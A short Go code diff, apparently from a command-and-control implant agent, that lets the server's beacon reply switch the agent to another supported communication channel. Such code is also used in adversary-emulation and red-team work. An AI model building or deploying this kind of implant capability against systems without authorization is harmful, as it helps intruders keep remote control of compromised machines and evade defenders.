@@ -29,6 +29,13 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 			checkin = time.Now()
 		}
 		if beacon["contact"] != nil {
+			c2 := beacon["contact"].(string)
+			output.VerbosePrint(fmt.Sprintf("[*] Switching to %s channel", c2))
+			if _, valid := contact.CommunicationChannels[c2]; valid {
+				coms, _ = contact.CommunicationChannels[c2]
+			} else {
+				output.VerbosePrint(fmt.Sprintf("[-] %s channel not supported", c2))
+			}
 		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			cmds := reflect.ValueOf(beacon["instructions"])
